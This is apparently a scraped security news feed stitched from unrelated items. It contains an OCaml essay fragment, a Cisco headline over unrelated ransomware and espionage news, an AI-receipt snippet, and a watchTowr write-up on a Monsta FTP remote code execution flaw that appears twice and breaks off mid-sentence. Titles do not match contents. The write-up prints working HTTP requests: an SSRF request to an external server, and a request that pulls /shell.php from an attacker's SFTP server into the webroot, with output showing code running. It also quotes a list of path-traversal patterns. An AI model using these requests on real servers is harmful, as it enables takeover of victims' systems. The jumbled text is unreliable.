many different languages, and as a result I have collected a list of
characteristics that I’ve come to appreciate over time. I think my
journey into programming is different from many. I learned and adored
functional programming before working in the industry, and while not my
very first language, Haskell was important to me early on. Functional
programming has allowed me to break big, complex problems down into
subproblems that I know how to solve. It has made me a better thinker.
Add to that the static guarantees of Haskell, which makes the mental
overhead much lower than for other languages, and I am also more
productive. Most importantly, with Haskell, I can focus more on the fun
parts of programming.However, Haskell’s issues lie in its immense complexity and slow
compile times. I did say that Haskell lowers the mental overhead of
programming, but that’s only if you use a small subset of the language.
However because much of the community is very maximalist, introducing a
lot of complexity into the code becomes inevitable. Much of the code you
interact with is too “smart”, and becomes very hard to grok. Its runtime
is also very complex, and there’s always the chance of running into
notorious “space leaks”, that are extremely hard to debug.At some point, I started exploring a language that is probably the
polar opposite to Haskell: Go. With Go, I learned to appreciate
simplicity and low-levels of abstractions, a good set of tooling, fast
performance and fast compilation speed. I also started to appreciate
good documentation that is easily available offline. The culture around
Go also places a lot of value on simple solutions, which made
interacting with the ecosystem easier. I can jump into any code base and
understand what is happening.Over time, I also grew to hate the issues that come
with the language being so conservative: it is verbose in its error
handling yet manages to be fragile. At the same time, it doesn’t
have explicit null checks. These factors combined makes Go quite unpleasant and
easy to write buggy code in. I also found myself missing a REPL or fast
way of interacting with the program. The language is “predictably
disappointing”, which I guess is a good thing. However, the solutions to
those disappointments have been around before the language was even
created and I am just left feeling that these solutions could have been
implemented, and the compiler would not be much more complex as a
result. It just genuinely felt like the Go language designers didn’t
want to engage with any of the ideas coming from functional programming.
But I digress.From these experiences, a list of features I consider to be “good”
features in a general programming language started to emerge:Fewer abstractions, and an easy to understand runtimeFunctional programming constructs. Especially pattern matching and
sum types.And then, enter OCaml. This language just checks so many boxes:Strong static guarantees. Sum types, polymorphic variants, pattern
matching.Simpler runtime semantics. OCaml is weird in that it’s a garbage
collected language for systems, similar to Go. A seasoned OCaml
programmer is probably able to gauge what the compiled assembler looks
like just by looking at the code. That is a great quality.Fast compile times. When using Haskell or Rust, the slow compile
times really kill your productivity. With Dune, OCaml compiles extremely
fast. Faster than Go I believe?Similar to Go, OCaml can be compiled statically into a single
binary, making it easy to deploy.Great documentation. OCaml has odig to browse documentation offline,
utop as a REPL to explore code, and also separates interface files from
implementation files. This makes it very pleasant to browse OCaml code.
The types help guide the user.Automatically inferred types. I didn’t think this would matter, as
writing out types explicitly used to help my thinking. But now that I am more
“fluent”, I appreciated just having the types be deduced for me. In OCaml, modules
separate interface files from implementation, and these are a better
place to put types in my opinion.I’m left feeling that the authors of OCaml have good taste. It
is an old language, and there are a few features that could probably be left out
like the OOP-related features, and some libraries in the ecosystem over-complicate things
like in Haskell. But overall, it’s just damn good. There are a lot of
other features I appreciate about OCaml that I didn’t share. But to
summarize why I love it: the right balance between simple and
expressive, good documentation and good tooling.]]></content:encoded></item><item><title>Cisco Issues Critical Warning Over New Unified Contact Center Express Vulnerabilities</title><link>https://thecyberexpress.com/cisco-warns-of-cve-2025-20354/</link><author></author><category>security</category><pubDate>Fri, 7 Nov 2025 14:00:12 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

The defendants allegedly acted as BlackCat affiliates, breaching networks, stealing data, deploying encryption malware, and demanding cryptocurrency ransoms. Victims included medical, pharmaceutical, and engineering firms. Prosecutors say the ransom demands ranged from $300,000 to $10 million, with one company paying out $1.27 million. The trio faces up to 50 years each in prison if convicted.Also this week,  stolen via fraudulent IT worker schemes. The designated include Ryujong Credit Bank and Korea Mangyongdae Computer Technology Company (KMCTC), along with executives and bankers responsible for managing funds linked to ransomware attacks and UN sanctions violations. OFAC says that over the last 3 years DPRK-affiliated cybercriminals have stolen more than $3 billion in cryptocurrency using malware and social engineering. The sanctions freeze U.S. assets and warn that transactions with these entities risk secondary penalties.In Europe, . The criminals allegedly created fake crypto investment platforms that promised high returns and recruited victims through social media, cold calls, and fake endorsements from celebrity investors. Victims lost their funds while the suspects laundered the stolen assets using blockchain tools. In operations coordinated by Eurojust in Cyprus, Spain, and Germany, law enforcement seized cash, crypto, and bank accounts.The Bad | SleepyDuck Trojan Exploits Ethereum Smart Contracts to Evade Takedown, researchers say. The malware uses Ethereum smart contracts to manage its command and control (C2) communications, helping it to maintain persistence even if its main server is taken down.Initially benign when published on October 31, the infected extension, juan-bianco.solidity-vlang, became malicious after an update made the following day, by which time it had already been downloaded 14,000 times. For now, the extension remains available on Open VSX with a public warning. In total, it has been downloaded over 53,000 times.Security researchers report that SleepyDuck activates when the code editor starts, a Solidity file opens, or when a compile command runs. It disguises its malicious activity through a fake  function from , while secretly executing payloads that collect system information such as hostnames, usernames, MAC addresses, and timezones.After it is triggered, the trojan queries the Ethereum blockchain to find the fastest RPC provider, read its C2 details, and enter a polling loop for new instructions. This blockchain-based C2 redundancy means that .In response, Open VSX has introduced new security measures, including shorter token lifetimes, automated scans, revoking any leaked credentials, and working in coordination with VS Code to block emerging threats. Best practices for developers include verifying extension publishers and installing software only from trusted repositories to avoid supply-chain compromises.The Ugly | Iran-Based Actors Target U.S. Policy Experts in New Espionage CampaignBetween June and August, a newly identified threat cluster dubbed ‘UNK_SmudgedSerpent’  focused on the Middle East. The campaign, coinciding with rising Iran-Israel tensions, uses politically-themed lures related to Iranian domestic affairs and the militarization of the Islamic Revolutionary Guard Corps (IRGC).Researchers say the threat actors behind the campaign initiated attacks with benign email exchanges before introducing phishing links impersonating prominent U.S. foreign policy figures and think tank institutions like the Brookings Institution and Washington Institute. The targeted victims, over 20 U.S.-based experts on Iran-related policy, were enticed to open malicious meeting documents and login pages designed to harvest their Microsoft account credentials. In some attacks, the attackers sent URLs leading to fake MS Teams login pages but pivoted to spoofed OnlyOffice sites if the victim grew suspicious.Clicking the links led to the download of malicious MSI installers disguised as Microsoft Teams, which then deployed legitimate remote monitoring and management (RMM) software like PDQ Connect. Subsequent activity suggests attackers manually installed additional tools such as ISL Online, indicating possible hands-on-keyboard intrusion.Researchers note that the operation’s tactics mirror those of known Iranian cyberespionage groups such as TA455 (UNC1549, Smoke Sandstorm), TA453 (TunnelVision, APT 35, UNC788), and TA450 (TEMP.Zagros).

We get it. Go sit in the middle of the highway. That can also be safe, “it just depends”.Our journey began, initially, with a specific version of Monsta FTP in the “crosshairs” so to speak. Specifically, Monsta FTP  .Those of you who live/breathe version numbers of enterprise-used software, this version number likely has you frothing at the mouth. For those that aren’t, we will just tell you what the rabid already know - this is not the latest version of Monsta FTP, which at the time of our research was  published in July 2025.Wipe the froth away, and let us explain - why are we looking at an older version?Well, our research shows that a significant portion of the Internet is still not running the latest version (surprise!) and the powers-that-be had some random theory.Random theories aside, Monsta FTP has a fascinating history of vulnerabilities. Following a gut feeling of general unease, we started our endeavours by determining if previous vulnerabilities had been patched correctly.Looking through our favourite, shiniest CVE database - three (that’s 3) vulnerabilities stood out, supposedly affecting .That’s just 1 minor version before our target ! (Look at us, maths!)CVE-2022-31827 : Monsta FTP v2.10.3 was discovered to contain a Server-Side Request Forgery (SSRF) via the function performFetchRequest at HTTPFetcher.php.CVE-2022-27469 : Monsta FTP v2.10.3 was discovered to allow attackers to execute Server-Side Request Forgery (SSRF).CVE-2022-27468 : Monsta FTP v2.10.3 was discovered to contain an arbitrary file upload which allows attackers to execute arbitrary code via a crafted file uploaded to the web server.Cue the usual actions, we quickly deployed two (2) environments;One running vulnerable version  andOne running our target instance .Despite the 3 vulnerabilities reported in version , there is little to no change in the code in .In fact, the only code we were able to identify any change within was purely cosmetic.Scratching our heads and questioning reality around us, we wondered - could this mean that the vulnerabilities previously highlighted in  actually exist in later versions?After an exasperated sigh at the general state of the world, and beginning to get the feeling that this was about to become appropriately described as a ‘saga’, we continued.Within the aforementioned CVEs are a number of references - for example, CVE-2022-31827, the Server-Side Request Forgery vulnerability, references a PoC which when we blindly fired at both  and , worked.. “as expected” and was trivially reproduced:POST /application/api/api.php HTTP/1.1

In the references for CVE-2022-27468 was a link to a YouTube playlist (because, of course?) - but by the time we made it there, the videos had been marked as hidden:Following a suspicion that the SSRF reporter was the same as the user who reported the RCE vulnerability (and thus likely connected to the mysterious YouTube playlist), we went rummaging through their GitHub account - just in case a fleeting moment involving a compass and morals had hit them and prevented them from publishing a PoC.But alas, this was not the case.Given the above and the lack of code changes, we concluded the following: has a reported SSRF and RCE vulnerability has the same SSRF and RCE vulnerabilities, unfixedEverything is still awesomeIf Unsure, Apply Bubble WrapArmed with concern, we wanted to verify whether these vulnerabilities remained even in the latest version (at the time of research) - version .The codebase has undergone substantial changes over this period, and the developers have been clearly busy over the past three years. Alongside major new functionality, we noticed an intriguing addition: a file named .This file immediately stood out.It introduces a series of filtering functions applied across the application, including (but not limited to) explicit checks for path traversal and other input validation mechanisms:    /**
     * Check for directory traversal patterns
     */
    private static function containsDirectoryTraversal($path) {
        $patterns = [
            '../', '..\\\\', '..%2f', '..%2F', '..%5c', '..%5C',
            '%2e%2e%2f', '%2E%2E%2F', '%2e%2e%5c', '%2E%2E%5C',
            '....//....' // Double encoding attempts
        ];
        
        $lowerPath = strtolower($path);
        foreach ($patterns as $pattern) {
            if (strpos($lowerPath, $pattern) !== false) {
                return true;
            }
        }
        
        return false;
    }
There were also newly introduced functions to validate file paths:    /**
     * Validate and sanitize file paths to prevent directory traversal
     */
    public static function validateFilePath($path, $allowAbsolute = false) {
        if (!is_string($path)) {
            throw new InvalidArgumentException("Path must be a string");
        }
        
        if (strlen($path) > self::MAX_PATH_LENGTH) {
            throw new InvalidArgumentException("Path too long (max " . self::MAX_PATH_LENGTH . " characters)");
        }
        
        // Check for null bytes
        if (strpos($path, "\\0") !== false) {
            throw new InvalidArgumentException("Path contains null bytes");
        }
        
        // Check for directory traversal patterns
        if (self::containsDirectoryTraversal($path)) {
            throw new InvalidArgumentException("Path contains directory traversal sequences");
        }
        
        // Validate absolute paths if not allowed
        if (!$allowAbsolute && (substr($path, 0, 1) === '/' || preg_match('/^[a-zA-Z]:\\\\\\\\/', $path))) {
            throw new InvalidArgumentException("Absolute paths not allowed");
        }
        
        // Normalize the path
        return PathOperations::normalize($path);
    }
We won't list everything added, but rest assured - if it can be validated, a function has been added for it.These new filtering and validation helpers were subsequently applied throughout the codebase, wherever user input might be handled (and perhaps even in places it's definitely not). All the telltale signs of precise remediation.At first glance, we assumed these additions might represent (or at least relate to) fixes for the vulnerabilities we’ve been discussing - including the RCE identified as CVE-2022-27468.Before we went any deeper into the code, we decided to do a quick sanity check: by replaying our known-correct reproducer for the SSRF vulnerability (CVE-2025-31827) against the latest release ().Surprisingly? Shockingly? Disappointingly? Inevitably? It still worked.Which raises a question we couldn’t resist asking: did the developers actually know where to patch the vulnerabilities? (This is also the polite version of the question we originally asked).Or, did they just guess? Perhaps they never received the YouTube video playlist? Perhaps it was actually just Taylor Swift songs, subsequently hidden to confuse us all. And so, perhaps, following our shiny theory, they decided to wrap the entirety of the Monsta FTP in performative bubble wrap and called it a day.Honestly, at this stage and with what we’ve seen in general, we wouldn’t be shocked.Either way, the result is the same: the Monsta FTP code base now contains sprawling usage of validation functions that probably make you feel safe and secure - but don’t appear to actually have any material impact on the vulnerabilities they appear to be trying to resolve.Eventually, We Figured It OutAfter picking apart what felt like a web of overall confusion, we were able to make some progress in understanding the vulnerability itself.request={ <----[0]

It all starts with/mftp/application/api/api.php :At , we can see that the endpoint accepts a body parameter called  . Specifcially, the application expects a structured JSON blob as a value to  which Monsta FTP parses and uses to dispatch the right function.At , we specify a  - telling Monsta FTP whether we’re connecting to an FTP or SFTP server.At , we have a nested JSON blob called  - which contains the details of the external (S)FTP server we want to connect to, including  (specified at  and authenticationModeName (specified at  ) to allow a user to specify the type of authentication to use.At , the  parameter specifies the function we want to use within Monsta FTP once a successful connection is established.This code, with all available functions, is detailed in the switch statement below:function validateContextForAction($actionName, $context) {
        switch ($actionName) {
            case 'uploadFile':
            case 'uploadFileToNewDirectory':
            case 'uploadArchive':
                if (isset($context['remotePath'])) {
                    $validatedPath = InputValidator::validateFilePath($context['remotePath'], true);
                    // Additional upload-specific validation
                    if (isset($context['localPath'])) {
                        InputValidator::validateFileUpload($context['localPath'], $validatedPath);
                    }
                }

                if (isset($context['remotePath'])) {
                    InputValidator::validateFilePath($context['remotePath'], true);
                }
                break;
                
            .. snip ..
        }
Eagle-eyed readers will be quick to notice that absolutely everything is wrapped in the usage of  .Undeterred, very quickly, one specific switch case value stood out to us: .Validation only really matters if we’re trying to do something nefarious - but is generally going to be wholly useless if we’re using the code as intended.Unsurprisingly, the  switch case maps to a function with the same name: */
public function downloadFile($transferOperation) {
    $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION');

    if (!$this->handleDownloadFile($transferOperation))
        $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation);
}
When using Monsta FTP to connect to an SFTP server, maps to application/api/file_sources/connection/SFTPConnection.php .This, our friends, is where things start to look up:protected function handleDownloadFile($transferOperation) {
    $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath());  <---- [0]

     if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1]
         return true;

    // Check if remote file exists to provide better error information
    $statResult = stat($remoteURL);
    return false; // Copy failed
}
At  we can see that  is called.As we can see below, this function effectively joins two strings together - the external SFTP host, and a file path provided in the user-controlled parameter .
private function getRemoteFileURL($remotePath) {
    if ($remotePath == '/')
        $remotePath = '/./';
    return "ssh2.sftp://" . $this->sftpConnection . $remotePath;
}
At  within , we can see that the code is fairly simple: the  function is executed to transfer a file from the remote SFTP server to the location specified by the function .Surprisingly enough, the value returned by the function  is user-controlled - it’s the value of the  parameter.The code below, included for verbosity, shows how the  function proceeds to move files as instructed.public function copy($source, $destination) {
            $this->ensureConnectedAndAuthenticated('COPY_OPERATION');

						
						.. snip ..

            for ($i = 0; $i < sizeof($sources); ++$i) {
                $destinationPath = $destinations[$i];
                $destinationDir = PathOperations::remoteDirname($destinationPath);

                $sourcePathAndItem = $sources[$i];

                $sourcePath = $sourcePathAndItem[0];
                $sourceItem = $sourcePathAndItem[1];

                if ($destinationDir != "" && $destinationDir != "/" &&
                    array_search($destinationDir, $destinationDirs) === false) {
                    $destinationDirs[] = $destinationDir;
                    $this->makeDirectoryWithIntermediates($destinationDir);
                }

                if ($sourceItem === null)
                    $this->handleCopy($sourcePath, $destinationPath);
                else {
                    if ($sourceItem->isDirectory()) {
                        if (array_search($destinationPath, $destinationDirs) === false) {
                            $destinationDirs[] = $destinationPath;
                            $this->makeDirectoryWithIntermediates($destinationPath);
                        }
                    } else {
                        $this->handleCopy($sourcePath, $destinationPath);
                    }

                    $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions();
                }
            }

            .. snip ..
 }
If you’re following along at home, you’d be forgiven for thinking this is a cute little theory that looks great on paper but falls apart in practice.Here’s the idea (shocking, we know):Trick Monsta FTP into connecting to our remote SFTP host.Have Monsta FTP download a file we control.Tell Monsta FTP to write that file to an arbitrary path on the Monsta server.Spoiler: it actually worked.We spun up a malicious SFTP server, sent a  request to the Monsta FTP instance, and watched it behave exactly like we feared - it connected, pulled our payload, and wrote it to the specified path.The following HTTP request illustrates how this would work:POST /mftp/application/api/api.php HTTP/1.1
Host: {{Nostname}}
Content-Type: application/x-www-form-urlencoded

request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-IP}}","remoteUsername":"sftpuser","initialDirectory":"/","authenticationModeName":"Password","password":"password111","port":2222},"actionName":"downloadFile","context":{"remotePath":"/shell.php","localPath":"/var/www/html/mftp/index3.php"}}&csrf_token=6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e
Below, for completeness' sake, we verify that our new file has been successfully written to the specified file path:GET /mftp/index3.php HTTP/1.1

Decades ago, it required special paper and printers—I remember a company in the UK advertising its services to people trying to cover up their affairs. Then, receipts became computerized, and faking them required some artistic skills to make the page look realistic.Several receipts shown to the FT by expense management platforms demonstrated the realistic nature of the images, which included wrinkles in paper, detailed itemization that matched real-life menus, and signatures.The rise in these more realistic copies has led companies to turn to AI to help detect fake receipts, as most are too convincing to be found by human reviewers.The software works by scanning receipts to check the metadata of the image to discover whether an AI platform created it. However, this can be easily removed by users taking a photo or a screenshot of the picture.To combat this, it also considers other contextual information by examining details such as repetition in server names and times and broader information about the employee’s trip.Yet another AI-powered security arms race.]]></content:encoded></item><item><title>Hidden Logic Bombs in Malware-Laced NuGet Packages Set to Detonate Years After Installation</title><link>https://thehackernews.com/2025/11/hidden-logic-bombs-in-malware-laced.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgO8rdEXn4OiPHiiJnsEymue5DlWPMj7u6ZfFy77r6q_HntR6yOsA-4dEQXLqdkPUJNs9TwgPJO4TeBDDz5nsX3QZkIi_I1Be45_AXRqgDkEuMuu8-pvYj0sAQfYCltYGbWMup2aRypVEyCSyAF46haWxabn5UPUPnCl_TnG6H4FvB62Hxa2ITd_vcZRr8X/s1600/countdown-malware.jpg" length="" type=""/><pubDate>Fri, 7 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A set of nine malicious NuGet packages has been identified as capable of dropping time-delayed payloads to sabotage database operations and corrupt industrial control systems.

(Monsta FTP Remote Code Execution CVE-2025-34299)

Happy Friday, friends and.. others.

We’re glad/sorry to hear that your week has been good/bad, and it’s the weekend/but at least it’s almost the weekend!

### What’re We Doing Today, Mr Fox?

Today, in a tale that seems all too familar at this point, we begun as innocently as always - to reproduce an N-day in Monsta FTP as part of our emerging threat rapid reaction process we enact across the watchTowr client base.

Yet, somehow, we find ourselves saddled with the reality of discussing another zero-day.

“What on earth is Monsta FTP?” you might say.

Monsta FTP is a web-based FTP client that lets users manage and transfer files directly through a browser on remote servers, with a minimum of 5,000 instances sitting on the Internet.

We say minimum because the default context path of `/mftp/` has the likely unintended side effect of masking the exposure of this technology from generic Internet-wide scanners.

With an external (S)FTP server in hand, it's possible to connect to that server and browse its contents through Monsta FTP with the full suite of Web 3/4/5/6/7/8/9.0 functionality available - uploading, downloading AND modifying of files in an easy and user-friendly interface:

With a proud user base ranging from financial institutions, enterprises and over-engineering individual users, Monsta FTP is an interesting target for threat actors - made only better by the fact that it’s written in PHP.

For the love of all things good, we know - using PHP does not inherently make things insecure. We get it.

Go sit in the middle of the highway. That can also be safe, “it just depends”.

Just like PHP.

### What The N-Day

Our journey began, initially, with a specific version of Monsta FTP in the “crosshairs” so to speak. Specifically, Monsta FTP `2.10.4` .

Those of you who live/breathe version numbers of enterprise-used software, this version number likely has you frothing at the mouth. For those that aren’t, we will just tell you what the rabid already know - this is not the latest version of Monsta FTP, which at the time of our research was `2.11` published in July 2025.

Wipe the froth away, and let us explain - why are we looking at an older version?

Well, our research shows that a significant portion of the Internet is still not running the latest version (surprise!) and the powers-that-be had some random theory.

Random theories aside, Monsta FTP has a fascinating history of vulnerabilities. Following a gut feeling of general unease, we started our endeavours by determining if previous vulnerabilities had been patched correctly.

Looking through our favourite, shiniest CVE database - three (that’s 3) vulnerabilities stood out, supposedly affecting `2.10.3`.

That’s just 1 minor version before our target `2.10.4`! (Look at us, maths!)

- CVE-2022-31827 : Monsta FTP v2.10.3 was discovered to contain a Server-Side Request Forgery (SSRF) via the function performFetchRequest at HTTPFetcher.php.
- CVE-2022-27469 : Monsta FTP v2.10.3 was discovered to allow attackers to execute Server-Side Request Forgery (SSRF).
- CVE-2022-27468 : Monsta FTP v2.10.3 was discovered to contain an arbitrary file upload which allows attackers to execute arbitrary code via a crafted file uploaded to the web server.

Cue the usual actions, we quickly deployed two (2) environments;

- One running vulnerable version `2.10.3` and
- One running our target instance `2.10.4`.

Despite the 3 vulnerabilities reported in version `2.10.3`, there is little to no change in the code in `2.10.4`.

In fact, the only code we were able to identify any change within was purely cosmetic.

Scratching our heads and questioning reality around us, we wondered - could this mean that the vulnerabilities previously highlighted in `2.10.3` actually exist in later versions?

After an exasperated sigh at the general state of the world, and beginning to get the feeling that this was about to become appropriately described as a ‘saga’, we continued.

Within the aforementioned CVEs are a number of references - for example, CVE-2022-31827, the Server-Side Request Forgery vulnerability, references a PoC which when we blindly fired at both `2.10.3` and `2.10.4`, worked.. “as expected” and was trivially reproduced:

```
POST /application/api/api.php HTTP/1.1 Host: {{Hostname}} Content-Length: 275 Content-Type: application/x-www-form-urlencoded request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-Server}}","remoteUsername":"zero","initialDirectory":"/tmp/","authenticationModeName":"Password","password":"123456","port":22},"actionName":"fetchRemoteFile","context":{"source":"http://{{External-Server}}/flag.txt"}}
```

In the references for CVE-2022-27468 was a link to a YouTube playlist (because, of course?) - but by the time we made it there, the videos had been marked as hidden:

Following a suspicion that the SSRF reporter was the same as the user who reported the RCE vulnerability (and thus likely connected to the mysterious YouTube playlist), we went rummaging through their GitHub account - just in case a fleeting moment involving a compass and morals had hit them and prevented them from publishing a PoC.

But alas, this was not the case.

Given the above and the lack of code changes, we concluded the following:

- Everything is awesome
- `2.10.3` has a reported SSRF and RCE vulnerability
- `2.10.4` has the same SSRF and RCE vulnerabilities, unfixed
- Everything is still awesome

### If Unsure, Apply Bubble Wrap

Armed with concern, we wanted to verify whether these vulnerabilities remained even in the latest version (at the time of research) - version `2.11`.

The codebase has undergone substantial changes over this period, and the developers have been clearly busy over the past three years. Alongside major new functionality, we noticed an intriguing addition: a file named `inputValidator.php`.

This file immediately stood out.

It introduces a series of filtering functions applied across the application, including (but not limited to) explicit checks for path traversal and other input validation mechanisms:

```
/** * Check for directory traversal patterns */ private static function containsDirectoryTraversal($path) { $patterns = [ '../', '..\\\\', '..%2f', '..%2F', '..%5c', '..%5C', '%2e%2e%2f', '%2E%2E%2F', '%2e%2e%5c', '%2E%2E%5C', '....//....' // Double encoding attempts ]; $lowerPath = strtolower($path); foreach ($patterns as $pattern) { if (strpos($lowerPath, $pattern) !== false) { return true; } } return false; }
```

There were also newly introduced functions to validate file paths:

```
/** * Validate and sanitize file paths to prevent directory traversal */ public static function validateFilePath($path, $allowAbsolute = false) { if (!is_string($path)) { throw new InvalidArgumentException("Path must be a string"); } if (strlen($path) > self::MAX_PATH_LENGTH) { throw new InvalidArgumentException("Path too long (max " . self::MAX_PATH_LENGTH . " characters)"); } // Check for null bytes if (strpos($path, "\\0") !== false) { throw new InvalidArgumentException("Path contains null bytes"); } // Check for directory traversal patterns if (self::containsDirectoryTraversal($path)) { throw new InvalidArgumentException("Path contains directory traversal sequences"); } // Validate absolute paths if not allowed if (!$allowAbsolute && (substr($path, 0, 1) === '/' || preg_match('/^[a-zA-Z]:\\\\\\\\/', $path))) { throw new InvalidArgumentException("Absolute paths not allowed"); } // Normalize the path return PathOperations::normalize($path); }
```

We won't list everything added, but rest assured - if it can be validated, a function has been added for it.

These new filtering and validation helpers were subsequently applied throughout the codebase, wherever user input might be handled (and perhaps even in places it's definitely not). All the telltale signs of precise remediation.

At first glance, we assumed these additions might represent (or at least relate to) fixes for the vulnerabilities we’ve been discussing - including the RCE identified as CVE-2022-27468.

Before we went any deeper into the code, we decided to do a quick sanity check: by replaying our known-correct reproducer for the SSRF vulnerability (CVE-2025-31827) against the latest release ( `2.11`).

Surprisingly? Shockingly? Disappointingly? Inevitably? It still worked.

Which raises a question we couldn’t resist asking: did the developers actually know where to patch the vulnerabilities? (This is also the polite version of the question we originally asked).

Or, did they just guess? Perhaps they never received the YouTube video playlist? Perhaps it was actually just Taylor Swift songs, subsequently hidden to confuse us all. And so, perhaps, following our shiny theory, they decided to wrap the entirety of the Monsta FTP in performative bubble wrap and called it a day.

Honestly, at this stage and with what we’ve seen in general, we wouldn’t be shocked.

Either way, the result is the same: the Monsta FTP code base now contains sprawling usage of validation functions that probably make you feel safe and secure - but don’t appear to actually have any material impact on the vulnerabilities they appear to be trying to resolve.

### Eventually, We Figured It Out

After picking apart what felt like a web of overall confusion, we were able to make some progress in understanding the vulnerability itself.

```
request={ <----[0] "connectionType": "sftp", <----[1] "configuration": { <----[2] "host": "{{External-SFTP-Server}}", "remoteUsername": "zero", "initialDirectory": "/tmp/", <----[3] "authenticationModeName": "Password", <----[4] "password": "123456", "port": 22 }, "actionName": "fetchRemoteFile", <----[5] "context": { "source": "http://{{External-Server}}/flag.txt" } }
```

It all starts with `/mftp/application/api/api.php` :

- At `[0]`, we can see that the endpoint accepts a body parameter called `request`. Specifcially, the application expects a structured JSON blob as a value to `request` which Monsta FTP parses and uses to dispatch the right function.
- At `[1]`, we specify a `connectionType`\- telling Monsta FTP whether we’re connecting to an FTP or SFTP server.
- At `[2]`, we have a nested JSON blob called `configuration`\- which contains the details of the external (S)FTP server we want to connect to, including `initialDirectory`(specified at `[3]` and authenticationModeName (specified at `[4]`) to allow a user to specify the type of authentication to use.
- At `[5]`, the `action` parameter specifies the function we want to use within Monsta FTP once a successful connection is established.

This code, with all available functions, is detailed in the switch statement below:

```
function validateContextForAction($actionName, $context) { switch ($actionName) { case 'uploadFile': case 'uploadFileToNewDirectory': case 'uploadArchive': if (isset($context['remotePath'])) { $validatedPath = InputValidator::validateFilePath($context['remotePath'], true); // Additional upload-specific validation if (isset($context['localPath'])) { InputValidator::validateFileUpload($context['localPath'], $validatedPath); } } break; case 'downloadFile': case 'fetchFile': case 'getFileContents': case 'deleteFile': if (isset($context['remotePath'])) { InputValidator::validateFilePath($context['remotePath'], true); } break; .. snip .. }
```

Eagle-eyed readers will be quick to notice that absolutely everything is wrapped in the usage of `InputValidators` .

Undeterred, very quickly, one specific switch case value stood out to us: `downloadFile`.

Validation only really matters if we’re trying to do something nefarious - but is generally going to be wholly useless if we’re using the code as intended.

Unsurprisingly, the `downloadFile` switch case maps to a function with the same name:

```
*/ public function downloadFile($transferOperation) { $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION'); if (!$this->handleDownloadFile($transferOperation)) $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation); }
```

When using Monsta FTP to connect to an SFTP server, `handleDownloadFile` maps to `application/api/file_sources/connection/SFTPConnection.php` .

This, our friends, is where things start to look up:

```
protected function handleDownloadFile($transferOperation) { $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath()); <---- [0] if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1] return true; // Check if remote file exists to provide better error information $statResult = stat($remoteURL); return false; // Copy failed }
```

At `[0]` we can see that `getRemoteFileURL` is called.

As we can see below, this function effectively joins two strings together - the external SFTP host, and a file path provided in the user-controlled parameter `remotePath`.

```
private function getRemoteFileURL($remotePath) { if ($remotePath == '/') $remotePath = '/./'; return "ssh2.sftp://" . $this->sftpConnection . $remotePath; }
```

At `[1]` within `handleDownloadFile`, we can see that the code is fairly simple: the `copy` function is executed to transfer a file from the remote SFTP server to the location specified by the function `getLocalPath`.

Surprisingly enough, the value returned by the function `getLocalPath` is user-controlled - it’s the value of the `localPath` parameter.

The code below, included for verbosity, shows how the `copy` function proceeds to move files as instructed.

```
public function copy($source, $destination) { $this->ensureConnectedAndAuthenticated('COPY_OPERATION'); .. snip .. for ($i = 0; $i < sizeof($sources); ++$i) { $destinationPath = $destinations[$i]; $destinationDir = PathOperations::remoteDirname($destinationPath); $sourcePathAndItem = $sources[$i]; $sourcePath = $sourcePathAndItem[0]; $sourceItem = $sourcePathAndItem[1]; if ($destinationDir != "" && $destinationDir != "/" && array_search($destinationDir, $destinationDirs) === false) { $destinationDirs[] = $destinationDir; $this->makeDirectoryWithIntermediates($destinationDir); } if ($sourceItem === null) $this->handleCopy($sourcePath, $destinationPath); else { if ($sourceItem->isDirectory()) { if (array_search($destinationPath, $destinationDirs) === false) { $destinationDirs[] = $destinationPath; $this->makeDirectoryWithIntermediates($destinationPath); } } else { $this->handleCopy($sourcePath, $destinationPath); } $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions(); } } .. snip .. }
```

Brilliant, we guess.

### Simple Is As Simple Does

If you’re following along at home, you’d be forgiven for thinking this is a cute little theory that looks great on paper but falls apart in practice.

Here’s the idea (shocking, we know):

1. Trick Monsta FTP into connecting to our remote SFTP host.
2. Have Monsta FTP download a file we control.
3. Tell Monsta FTP to write that file to an arbitrary path on the Monsta server.

Cute.

Spoiler: it actually worked.

We spun up a malicious SFTP server, sent a `downloadFile` request to the Monsta FTP instance, and watched it behave exactly like we feared - it connected, pulled our payload, and wrote it to the specified path.

The following HTTP request illustrates how this would work:

```
POST /mftp/application/api/api.php HTTP/1.1 Host: {{Nostname}} Content-Type: application/x-www-form-urlencoded request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-IP}}","remoteUsername":"sftpuser","initialDirectory":"/","authenticationModeName":"Password","password":"password111","port":2222},"actionName":"downloadFile","context":{"remotePath":"/shell.php","localPath":"/var/www/html/mftp/index3.php"}}&csrf_token=6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e
```

Below, for completeness' sake, we verify that our new file has been successfully written to the specified file path:

```
GET /mftp/index3.php HTTP/1.1 Host: {{Hostname}}
```

```
HTTP/1.1 200 OK Date: Fri, 05 Sep 2025 09:43:50 GMT Server: Apache/2.4.54 (Debian) X-Powered-By: PHP/7.4.33 Vary: Accept-Encoding Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 Content-Length: 75 watchTowr uid=33(www-data) gid=33(www-data) groups=33(www-data) watchTowr
```

So there we have it - a pre-authenticated Remote Code Execution vulnerability in the latest (at the time) release of Monsta FTP.

While we can’t definitively confirm whether the above vulnerability is identical to CVE-2022-27468, we can confidently state that this vulnerability has been patched as of version `2.11.3`, released on 26 August 2025.

As of November 4, 2025, a new CVE has been assigned with an updated description: CVE-2025-34299.

Sigh.

This ranges
